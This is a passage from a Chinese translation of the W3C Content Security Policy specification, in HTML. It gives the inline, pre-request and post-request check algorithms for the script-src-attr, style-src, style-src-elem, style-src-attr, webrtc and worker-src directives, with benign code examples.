                        <var>name</var>、<code>script-src-elem</code> 和 <var>policy</var> 上的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                </li>
                <li data-md>
                    <p>如果执行 <a href="#match-element-to-source-list">§ 6.7.3.3 元素是否匹配类型和源的源列表？</a> 在
                        <var>element</var>、该指令的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value③②">值</a>、<var>type</var> 和 <var>source</var> 上的结果为
                        "<code>Does Not Match</code>"，则返回 "<code>Blocked</code>"。
                    </p>
                </li>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
                </li>
            </ol>
            <h4 class="heading settled" data-level="6.1.12" id="directive-script-src-attr"><span class="secno">6.1.12.
                </span><span class="content"><code>script-src-attr</code></span><a class="self-link"
                    href="#directive-script-src-attr"></a></h4>
            <p>此指令的名称和值的语法如下 ABNF 描述：</p>
            <pre>directive-name  = "script-src-attr"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①①">serialized-source-list</a>
</pre>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="script-src-attr">script-src-attr</dfn>
                指令适用于事件处理程序，如果存在，它将覆盖 <code>script-src</code> 指令以进行相关检查。</p>
            <h5 class="heading settled algorithm" data-algorithm="script-src-attr 内联检查" data-level="6.1.12.1"
                id="script-src-attr-inline"><span class="secno">6.1.12.1. </span><span
                    class="content"><code>script-src-attr</code> 内联检查</span><a class="self-link"
                    href="#script-src-attr-inline"></a></h5>
            <p>此指令的 <a data-link-type="dfn" href="#directive-inline-check"
                    id="ref-for-directive-inline-check⑥">内联检查</a>算法如下：</p>
            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element⑤">元素</a></code>
                <var>element</var>，一个字符串 <var>type</var>，一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤③">策略</a>
                <var>policy</var> 和一个字符串 <var>source</var>：
            </p>
            <ol>
                <li data-md>
                    <p class="assertion">断言：<var>element</var> 不为 null 或 <var>type</var> 为 "<code>navigation</code>"。
                    </p>
                </li>
                <li data-md>
                    <p>将 <var>name</var> 设为执行 <a href="#effective-directive-for-inline-check">§ 6.8.2 获取内联检查的有效指令</a> 在
                        <var>type</var> 上的结果。
                    </p>
                </li>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 是否应执行取指令</a> 在
                        <var>name</var>、<code>script-src-attr</code> 和 <var>policy</var> 上的结果为 "<code>No</code>"，则返回
                        "<code>Allowed</code>"。
                    </p>
                </li>
                <li data-md>
                    <p>如果执行 <a href="#match-element-to-source-list">§ 6.7.3.3 元素是否匹配类型和源的源列表？</a> 在
                        <var>element</var>、该指令的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value③③">值</a>、<var>type</var> 和 <var>source</var> 上的结果为
                        "<code>Does Not Match</code>"，则返回 "<code>Blocked</code>"。
                    </p>
                </li>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
                </li>
            </ol>
            <h4 class="heading settled" data-level="6.1.13" id="directive-style-src"><span class="secno">6.1.13.
                </span><span class="content"><code>style-src</code></span><a class="self-link"
                    href="#directive-style-src"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="style-src">style-src</dfn> 指令限制了可以将样式应用于
                <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document⑨">文档</a></code>
                的位置。该指令名称和值的语法如下 ABNF 描述：
            </p>
            <pre>directive-name  = "style-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①②">serialized-source-list</a>
</pre>
            <p><code>style-src</code> 指令控制以下几项：</p>
            <ol>
                <li data-md>
                    <p>样式 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                            id="ref-for-concept-request④③">请求</a> 必须通过 <a href="#should-block-request"
                            id="ref-for-should-block-request⑤">§ 4.1.2 内容安全策略应阻止请求吗？</a>。包括：</p>
                    <ol>
                        <li data-md>
                            <p>从 <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-link-element" id="ref-for-the-link-element①">link</a></code>
                                元素发起的样式表请求。
                        <li data-md>
                            <p>从 <a class="css" data-link-type="at-rule"
                                    href="https://www.w3.org/TR/css-cascade-5/#at-ruledef-import"
                                    id="ref-for-at-ruledef-import"><code>@import</code></a> 规则发起的样式表请求。
                        <li data-md>
                            <p>从 <code>Link</code> HTTP 响应头字段 <a data-link-type="biblio" href="#biblio-rfc8288"
                                    title="Web Linking">[RFC8288]</a> 发起的样式表请求。
                    </ol>
                <li data-md>
                    <p>样式请求的 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response"
                            id="ref-for-concept-response②①">响应</a> 必须通过 <a href="#should-block-response"
                            id="ref-for-should-block-response⑤">§ 4.1.3 内容安全策略应阻止请求的响应吗？</a>。
                <li data-md>
                    <p>内联
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-style-element" id="ref-for-the-style-element">style</a></code>
                        块必须通过 <a href="#should-block-inline" id="ref-for-should-block-inline⑥">§ 4.2.3
                            元素的内联类型行为应被内容安全策略阻止吗？</a>。除非每个策略允许内联样式，样式将被阻止。允许方式包括：不指定 <code>style-src</code>（或
                        <code>default-src</code>）指令，或者显式指定 "<code>unsafe-inline</code>"，<a data-link-type="grammar"
                            href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source③">nonce-source</a> 或 <a
                            data-link-type="grammar" href="#grammardef-hash-source"
                            id="ref-for-grammardef-hash-source③">hash-source</a> 匹配内联块。
                <li data-md>
                    <p>以下 CSS 算法受到 <code>unsafe-eval</code> 源表达式的限制：</p>
                    <ol>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://www.w3.org/TR/cssom-1/#insert-a-css-rule"
                                    id="ref-for-insert-a-css-rule">插入 CSS 规则</a>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://www.w3.org/TR/cssom-1/#parse-a-css-rule"
                                    id="ref-for-parse-a-css-rule">解析 CSS 规则</a>
                        <li data-md>
                            <p><a data-link-type="dfn"
                                    href="https://www.w3.org/TR/cssom-1/#parse-a-css-declaration-block"
                                    id="ref-for-parse-a-css-declaration-block">解析 CSS 声明块</a>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://www.w3.org/TR/cssom-1/#parse-a-group-of-selectors"
                                    id="ref-for-parse-a-group-of-selectors">解析选择器组</a>
                    </ol>
                    <p>这包括例如 CSSOM 的各种 <code>cssText</code> 设置器和 <code>insertRule</code> 方法的所有调用 <a
                            data-link-type="biblio" href="#biblio-cssom" title="CSS Object Model (CSSOM)">[CSSOM]</a> <a
                            data-link-type="biblio" href="#biblio-html" title="HTML Standard">[HTML]</a>。
                    <p class="issue" id="issue-ba1a0a35"><a class="self-link" href="#issue-ba1a0a35"></a> 需要对此进行更好的解释。<a
                            href="https://github.com/w3c/webappsec-csp/issues/212">[Issue #w3c/webappsec-csp#212]</a>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="style-src 预请求检查" data-level="6.1.13.1"
                id="style-src-pre-request"><span class="secno">6.1.13.1. </span><span class="content">
                    <code>style-src</code> 预请求检查 </span><a class="self-link" href="#style-src-pre-request"></a></h5>
            <p>该指令的<a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check①④">预请求检查</a>如下：</p>
            <p>给定一个<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request④④">请求</a> <var>request</var> 和一个<a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤④">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>执行<a href="#effective-directive-for-a-request">§ 6.8.1
                            获取请求的有效指令</a>，获取<var>request</var>的<var>name</var>。</p>
                <li data-md>
                    <p>如果执行<a href="#should-directive-execute">§ 6.8.4
                            是否应执行获取指令</a>后，<var>name</var>、<code>style-src</code>和<var>policy</var>的结果为"<code>No</code>"，则返回"<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行<a href="#match-nonce-to-source-list">§ 6.7.2.3 nonce是否匹配源列表</a>后，<var>request</var>的<a
                            data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata"
                            id="ref-for-concept-request-nonce-metadata①">加密nonce元数据</a>与此指令的<a data-link-type="dfn"
                            href="#directive-value"
                            id="ref-for-directive-value③④">值</a>结果为"<code>Matches</code>"，则返回"<code>Allowed</code>"。</p>
                <li data-md>
                    <p>如果执行<a href="#match-request-to-source-list">§ 6.7.2.5 请求是否匹配源列表</a>后，<var>request</var>、此指令的<a
                            data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value③⑤">值</a>和<var>policy</var>的结果为"<code>Does Not Match</code>"，则返回"<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回"<code>Allowed</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="style-src 后请求检查" data-level="6.1.13.2"
                id="style-src-post-request"><span class="secno">6.1.13.2. </span><span class="content">
                    <code>style-src</code> 后请求检查 </span><a class="self-link" href="#style-src-post-request"></a></h5>
            <p>该指令的<a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check①⑤">后请求检查</a>如下：</p>
            <p>给定一个<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request④⑤">请求</a> <var>request</var>，一个<a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②②">响应</a>
                <var>response</var>，以及一个<a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object⑤⑤">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>执行<a href="#effective-directive-for-a-request">§ 6.8.1
                            获取请求的有效指令</a>，获取<var>request</var>的<var>name</var>。</p>
                <li data-md>
                    <p>如果执行<a href="#should-directive-execute">§ 6.8.4
                            是否应执行获取指令</a>后，<var>name</var>、<code>style-src</code>和<var>policy</var>的结果为"<code>No</code>"，则返回"<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行<a href="#match-nonce-to-source-list">§ 6.7.2.3 nonce是否匹配源列表</a>后，<var>request</var>的<a
                            data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata"
                            id="ref-for-concept-request-nonce-metadata②">加密nonce元数据</a>与此指令的<a data-link-type="dfn"
                            href="#directive-value"
                            id="ref-for-directive-value③⑥">值</a>结果为"<code>Matches</code>"，则返回"<code>Allowed</code>"。</p>
                <li data-md>
                    <p>如果执行<a href="#match-response-to-source-list">§ 6.7.2.6
                            响应是否匹配源列表</a>后，<var>response</var>、<var>request</var>、此指令的<a data-link-type="dfn"
                            href="#directive-value"
                            id="ref-for-directive-value③⑦">值</a>和<var>policy</var>的结果为"<code>Does Not Match</code>"，则返回"<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回"<code>Allowed</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="style-src 内联检查" data-level="6.1.13.3"
                id="style-src-inline"><span class="secno">6.1.13.3. </span><span class="content"> <code>style-src</code>
                    内联检查 </span><a class="self-link" href="#style-src-inline"></a></h5>
            <p>该指令的<a data-link-type="dfn" href="#directive-inline-check"
                    id="ref-for-directive-inline-check⑦">内联检查</a>算法如下：</p>
            <p>给定一个<code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element⑥">元素</a></code>
                <var>element</var>，一个字符串<var>type</var>，一个<a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object⑤⑥">策略</a>
                <var>policy</var>，以及一个字符串<var>source</var>：
            </p>
            <ol>
                <li data-md>
                    <p>执行<a href="#effective-directive-for-inline-check">§ 6.8.2
                            获取内联检查的有效指令</a>，获取<var>type</var>的<var>name</var>。</p>
                <li data-md>
                    <p>如果执行<a href="#should-directive-execute">§ 6.8.4
                            是否应执行获取指令</a>后，<var>name</var>、<code>style-src</code>和<var>policy</var>的结果为"<code>No</code>"，则返回"<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>如果执行<a href="#match-element-to-source-list">§ 6.7.3.3 元素是否匹配源列表</a>后，<var>element</var>、此指令的<a
                            data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value③⑧">值</a>、<var>type</var>和<var>source</var>的结果为"<code>Does Not Match</code>"，则返回"<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回"<code>Allowed</code>"。</p>
            </ol>
            <p>该指令的<a data-link-type="dfn" href="#directive-initialization"
                    id="ref-for-directive-initialization②">初始化</a>算法如下：</p>
            <p class="issue" id="issue-6fa220c3"><a class="self-link" href="#issue-6fa220c3"></a>
                对执行上下文做一些有趣的操作，以锁定有趣的CSSOM算法。我认为CSSOM在这里没有给我们任何钩子，所以我们需要与他们合作以制定合理的解决方案。</p>
            <h4 class="heading settled" data-level="6.1.14" id="directive-style-src-elem"><span class="secno">6.1.14.
                </span><span class="content"><code>style-src-elem</code></span><a class="self-link"
                    href="#directive-style-src-elem"></a></h4>
            <p>该指令的名称和值的语法由以下 ABNF 描述：</p>
            <pre>directive-name  = "style-src-elem"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①③">serialized-source-list</a>
</pre>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="style-src-elem">style-src-elem</dfn>
                指令管理样式的行为，除内联属性定义的样式外。</p>
            <h5 class="heading settled algorithm" data-algorithm="style-src-elem 前请求检查" data-level="6.1.14.1"
                id="style-src-elem-pre-request"><span class="secno">6.1.14.1. </span><span class="content">
                    <code>style-src-elem</code> 前请求检查 </span><a class="self-link"
                    href="#style-src-elem-pre-request"></a></h5>
            <p>该指令的<a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check①⑤">前请求检查</a>如下：</p>
            <p>给定一个<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request④⑥">请求</a> <var>request</var> 和一个<a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤⑦">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>执行<a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a>，获取 <var>request</var> 的
                        <var>name</var>。
                    </p>
                <li data-md>
                    <p>如果执行<a href="#should-directive-execute">§ 6.8.4
                            是否应执行获取指令</a>后，<var>name</var>、<code>style-src-elem</code> 和 <var>policy</var> 的结果为
                        "<code>No</code>"，则返回 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p>如果执行<a href="#match-nonce-to-source-list">§ 6.7.2.3 nonce 是否匹配源列表</a>后，<var>request</var> 的 <a
                            data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata"
                            id="ref-for-concept-request-nonce-metadata③">加密 nonce 元数据</a> 和该指令的 <a data-link-type="dfn"
                            href="#directive-value" id="ref-for-directive-value③⑨">值</a> 结果为
                        "<code>Matches</code>"，则返回 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p>如果执行<a href="#match-request-to-source-list">§ 6.7.2.5 请求是否匹配源列表</a>后，<var>request</var>、该指令的 <a
                            data-link-type="dfn" href="#directive-value" id="ref-for-directive-value④⓪">值</a> 和
                        <var>policy</var> 的结果为
                        "<code>Does Not Match</code>"，则返回 "<code>Blocked</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="style-src-elem 后请求检查" data-level="6.1.14.2"
                id="style-src-elem-post-request"><span class="secno">6.1.14.2. </span><span class="content">
                    <code>style-src-elem</code> 后请求检查 </span><a class="self-link"
                    href="#style-src-elem-post-request"></a></h5>
            <p>该指令的<a data-link-type="dfn" href="#directive-post-request-check"
                    id="ref-for-directive-post-request-check①⑥">后请求检查</a>如下：</p>
            <p>给定一个<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request④⑦">请求</a> <var>request</var>，一个<a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②③">响应</a>
                <var>response</var>，以及一个<a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object⑤⑧">策略</a> <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>执行<a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a>，获取 <var>request</var> 的
                        <var>name</var>。
                    </p>
                <li data-md>
                    <p>如果执行<a href="#should-directive-execute">§ 6.8.4
                            是否应执行获取指令</a>后，<var>name</var>、<code>style-src-elem</code> 和 <var>policy</var> 的结果为
                        "<code>No</code>"，则返回 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p>如果执行<a href="#match-nonce-to-source-list">§ 6.7.2.3 nonce 是否匹配源列表</a>后，<var>request</var> 的 <a
                            data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata"
                            id="ref-for-concept-request-nonce-metadata④">加密 nonce 元数据</a> 和该指令的 <a data-link-type="dfn"
                            href="#directive-value" id="ref-for-directive-value④①">值</a> 结果为
                        "<code>Matches</code>"，则返回 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p>如果执行<a href="#match-response-to-source-list">§ 6.7.2.6
                            响应是否匹配源列表</a>后，<var>response</var>、<var>request</var>、该指令的 <a data-link-type="dfn"
                            href="#directive-value" id="ref-for-directive-value④②">值</a> 和 <var>policy</var> 的结果为
                        "<code>Does Not Match</code>"，则返回 "<code>Blocked</code>"。</p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h5 class="heading settled algorithm" data-algorithm="style-src-elem 内联检查" data-level="6.1.14.3"
                id="style-src-elem-inline"><span class="secno">6.1.14.3. </span><span class="content">
                    <code>style-src-elem</code> 内联检查 </span><a class="self-link" href="#style-src-elem-inline"></a></h5>
            <p>该指令的<a data-link-type="dfn" href="#directive-inline-check"
                    id="ref-for-directive-inline-check⑧">内联检查</a>算法如下：</p>
            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element⑦">元素</a></code>
                <var>element</var>，一个字符串 <var>type</var>，一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑤⑨">策略</a>
                <var>policy</var>，以及一个字符串 <var>source</var>：
            </p>
            <ol>
                <li data-md>
                    <p>执行<a href="#effective-directive-for-inline-check">§ 6.8.2 获取内联检查的有效指令</a>，获取 <var>type</var> 的
                        <var>name</var>。
                    </p>
                <li data-md>
                    <p>如果执行<a href="#should-directive-execute">§ 6.8.4
                            是否应执行获取指令</a>后，<var>name</var>、<code>style-src-elem</code> 和 <var>policy</var> 的结果为
                        "<code>No</code>"，则返回 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p>如果执行<a href="#match-element-to-source-list">§ 6.7.3.3 元素是否匹配源列表</a>后，<var>element</var>、该指令的 <a
                            data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value④③">值</a>、<var>type</var> 和 <var>source</var> 的结果为
                        "<code>Does Not Match</code>"，则返回 "<code>Blocked</code>"。</p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h4 class="heading settled" data-level="6.1.15" id="directive-style-src-attr"><span class="secno">6.1.15.
                </span><span class="content"><code>style-src-attr</code></span><a class="self-link"
                    href="#directive-style-src-attr"></a></h4>
            <p>该指令的名称和值的语法由以下 ABNF 描述：</p>
            <pre>directive-name  = "style-src-attr"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①④">serialized-source-list</a>
</pre>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="style-src-attr">style-src-attr</dfn>
                指令管理样式属性的行为。</p>
            <h5 class="heading settled algorithm" data-algorithm="style-src-attr 内联检查" data-level="6.1.15.1"
                id="style-src-attr-inline"><span class="secno">6.1.15.1. </span><span class="content">
                    <code>style-src-attr</code> 内联检查 </span><a class="self-link" href="#style-src-attr-inline"></a></h5>
            <p>该指令的<a data-link-type="dfn" href="#directive-inline-check"
                    id="ref-for-directive-inline-check⑨">内联检查</a>算法如下：</p>
            <p>给定一个 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element⑧">元素</a></code>
                <var>element</var>，一个字符串 <var>type</var>，一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥⓪">策略</a>
                <var>policy</var> 和一个字符串 <var>source</var>：
            </p>
            <ol>
                <li data-md>
                    <p>执行<a href="#effective-directive-for-inline-check">§ 6.8.2 获取内联检查的有效指令</a>，获取 <var>type</var> 的
                        <var>name</var>。
                    </p>
                <li data-md>
                    <p>如果执行<a href="#should-directive-execute">§ 6.8.4
                            是否应执行获取指令</a>后，<var>name</var>、<code>style-src-attr</code> 和 <var>policy</var> 的结果为
                        "<code>No</code>"，则返回 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p>如果执行<a href="#match-element-to-source-list">§ 6.7.3.3 元素是否匹配源列表</a>后，<var>element</var>、该指令的 <a
                            data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value④④">值</a>、<var>type</var> 和 <var>source</var> 的结果为
                        "<code>Does Not Match</code>"，则返回 "<code>Blocked</code>"。</p>
                <li data-md>
                    <p>返回 "<code>Allowed</code>"。</p>
            </ol>
            <h3 class="heading settled" data-level="6.2" id="directives-other"><span class="secno">6.2. </span><span
                    class="content">其他指令</span><a class="self-link" href="#directives-other"></a></h3>
            <h4 class="heading settled" data-level="6.2.1" id="directive-webrtc"><span class="secno">6.2.1. </span><span
                    class="content"><code>webrtc</code></span><a class="self-link" href="#directive-webrtc"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="webrtc">webrtc</dfn> 指令用于限制是否可以通过 WebRTC
                建立连接。该指令的名称和值的语法由以下 ABNF 描述：</p>
            <pre>directive-name  = "webrtc"
directive-value = "<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-allow">'allow'</dfn>" / "<dfn data-dfn-type="grammar" data-export id="grammardef-block">'block'<a class="self-link" href="#grammardef-block"></a></dfn>"
</pre>
            <div class="example" id="example-7e4cee69">
                <a class="self-link" href="#example-7e4cee69"></a> 假设页面具有以下内容安全策略：
                <pre>Content-Security-Policy: <a data-link-type="dfn" href="#webrtc" id="ref-for-webrtc">webrtc</a> 'block'
</pre>
                <p>本地 ICE 候选将不会出现，因为不会对提供给对等连接的 ICE 服务器进行 STUN 检查；不会对 JS
                    提供的任何远程候选进行连通性检查；连接状态将不会从初始状态“new”转换到“connected”，而是直接从“new”转换到“failed”。尝试调用 pc.restartIce()
                    将导致相同的结果。</p>
                <pre class="highlight"> <c- p>&lt;</c-><c- f>script</c-><c- p>></c->
   <c- a>const</c-> iceServers <c- o>=</c-> <c- p>[{</c->urls<c- o>:</c-> <c- u>"stun:stun.l.google.com:19302"</c-><c- p>}];</c->
   <c- a>const</c-> pc <c- o>=</c-> <c- ow>new</c-> RTCPeerConnection<c- p>({</c->iceServers<c- p>});</c->
   pc<c- p>.</c->createDataChannel<c- p>(</c-><c- u>""</c-><c- p>);</c->
   <c- a>const</c-> io <c- o>=</c-> <c- ow>new</c-> WebSocket<c- p>(</c-><c- t>'ws://example.com:8080'</c-><c- p>);</c->
   pc<c- p>.</c->onicecandidate <c- o>=</c-> <c- p>({</c->candidate<c- p>})</c-> <c- p>=></c-> io<c- p>.</c->send<c- p>({</c->candidate<c- p>});</c->
   pc<c- p>.</c->onnegotiationneeded <c- o>=</c-> <c- k>async</c-> <c- p>()</c-> <c- p>=></c-> <c- p>{</c->
     <c- k>await</c-> pc<c- p>.</c->setLocalDescription<c- p>();</c->
     io<c- p>.</c->send<c- p>({</c->description<c- o>:</c-> pc<c- p>.</c->localDescription<c- p>});</c->
   <c- p>};</c->
   io<c- p>.</c->onmessage <c- o>=</c-> <c- k>async</c-> <c- p>({</c->data<c- o>:</c-> <c- p>{</c->description<c- p>,</c-> candidate<c- p>}})</c-> <c- p>=></c-> <c- p>{</c->
     <c- k>if</c-> <c- p>(</c->description<c- p>)</c-> <c- p>{</c->
       <c- k>await</c-> pc<c- p>.</c->setRemoteDescription<c- p>(</c->description<c- p>);</c->
       <c- k>if</c-> <c- p>(</c->description<c- p>.</c->type <c- o>==</c-> <c- u>"offer"</c-><c- p>)</c-> <c- p>{</c->
         <c- k>await</c-> pc<c- p>.</c->setLocalDescription<c- p>();</c->
         io<c- p>.</c->send<c- p>({</c->description<c- o>:</c-> pc<c- p>.</c->localDescription<c- p>});</c->
       <c- p>}</c->
     <c- p>}</c-> <c- k>else</c-> <c- k>if</c-> <c- p>(</c->candidate<c- p>)</c-> <c- k>await</c-> pc<c- p>.</c->addIceCandidate<c- p>(</c->candidate<c- p>);</c->
   <c- p>};</c->
<c- p>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
            </div>
            <h5 class="heading settled algorithm" data-algorithm="webrtc 预连接检查" data-level="6.2.1.1"
                id="webrtc-pre-connect"><span class="secno">6.2.1.1. </span><span class="content"> <code>webrtc</code>
                    预连接检查 </span><a class="self-link" href="#webrtc-pre-connect"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-webrtc-pre-connect-check"
                    id="ref-for-directive-webrtc-pre-connect-check①">webrtc 预连接检查</a>如下：</p>
            <ol>
                <li data-md>
                    <p>如果该指令的 <a data-link-type="dfn" href="#directive-value"
                            id="ref-for-directive-value④⑤">值</a>仅包含一个与字符串 "<a data-link-type="grammar"
                            href="#grammardef-allow" id="ref-for-grammardef-allow"><code>'allow'</code></a>" 的
                        <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive"
                            id="ref-for-ascii-case-insensitive④">ASCII 不区分大小写</a>匹配项，则返回 "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p>返回 "<code>Blocked</code>"。</p>
            </ol>
            <h4 class="heading settled" data-level="6.2.2" id="directive-worker-src"><span class="secno">6.2.2.
                </span><span class="content"><code>worker-src</code></span><a class="self-link"
                    href="#directive-worker-src"></a></h4>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="worker-src">worker-src</dfn> 指令限制可以作为 <code
                    class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#worker" id="ref-for-worker②">Worker</a></code>、<code
                    class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#sharedworker" id="ref-for-sharedworker①">SharedWorker</a></code>
                或 <code
                    class="idl"><a data-link-type="idl" href="https://www.w3.org/TR/service-workers/#serviceworker" id="ref-for-serviceworker①">ServiceWorker</a></code>
                加载的 URL。该指令的名称和值的语法由以下 ABNF 描述：</p>
            <pre>directive-name  = "worker-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list①⑤">serialized-source-list</a>
</pre>
            <div class="example" id="example-fd6c5849">
                <a class="self-link" href="#example-fd6c5849"></a> 假设页面具有以下内容安全策略：
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①④">Content-Security-Policy</a>: <a data-link-type="dfn" href="#worker-src" id="ref-for-worker-src③">worker-src</a> https://example.com/
</pre>
                <p>以下代码的抓取将返回网络错误，因为提供的 URL 不匹配 <code>worker-src</code> 的 <a data-link-type="dfn" href="#source-lists"
                        id="ref-for-source-lists①⓪">源列表</a>：</p>
                <pre class="highlight"><c- p>&lt;</c-><c- f>script</c-><c- p>></c->
  <c- a>var</c-> blockedWorker <c- o>=</c-> <c- ow>new</c-> Worker<c- p>(</c-><c- u>"data:application/javascript,..."</c-><c- p>);</c->
  blockedWorker <c- o>=</c-> <c- ow>new</c-> SharedWorker<c- p>(</c-><c- u>"https://example.org/"</c-><c- p>);</c->
  navigator<c- p>.</c->serviceWorker<c- p>.</c->register<c- p>(</c-><c- t>'https://example.org/sw.js'</c-><c- p>);</c->
<c- p>&lt;/</c-><c- f>script</c-><c- p>></c->
</pre>
            </div>
            <h5 class="heading settled algorithm" data-algorithm="worker-src 预请求检查" data-level="6.2.2.1"
                id="worker-src-pre-request"><span class="secno">6.2.2.1. </span><span class="content">
                    <code>worker-src</code> 预请求检查 </span><a class="self-link" href="#worker-src-pre-request"></a></h5>
            <p>该指令的 <a data-link-type="dfn" href="#directive-pre-request-check"
                    id="ref-for-directive-pre-request-check①⑥">预请求检查</a>如下：</p>
            <p>给定一个 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request"
                    id="ref-for-concept-request④⑧">请求</a> <var>request</var> 和一个 <a data-link-type="dfn"
                    href="#content-security-policy-object" id="ref-for-content-security-policy-object⑥①">策略</a>
                <var>policy</var>：
            </p>
            <ol>
                <li data-md>
                    <p>对 <var>request</var> 执行 <a href="#effective-directive-for-a-request">§ 6.8.1 获取请求的有效指令</a>，结果赋值给
                        <var>name</var>。
                    </p>
                <li data-md>
                    <p>如果执行 <a href="#should-directive-execute">§ 6.8.4 指令是否应执行</a> 在
                        <var>name</var>、<code>worker-src</code> 和 <var>policy</var> 上的结果是 "<code>No</code>"，返回
                        "<code>Allowed</code>"。
                    </p>
                <li data-md>
